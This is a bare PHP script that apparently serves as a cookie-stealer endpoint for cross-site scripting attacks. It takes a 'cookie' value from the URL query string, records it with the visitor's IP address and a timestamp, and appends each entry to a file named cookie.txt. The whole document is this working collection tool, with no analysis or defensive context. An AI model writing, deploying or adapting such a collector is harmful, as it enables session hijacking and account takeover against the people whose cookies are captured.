<?php
    $cookie = $_GET['cookie'];
    $ip = getenv('REMOTE_ADDR');
    date_default_timezone_set('Europe/Paris');
    $time = date('Y-m-d g:i:s');
    $fp = fopen( 'cookie.txt', 'a');
    fwrite($fp, '|||'."IP: ".$ip." │ Time: ".$time." | Cookie: ".$cookie.'|||'."\n");
    fclose($fp);
?>

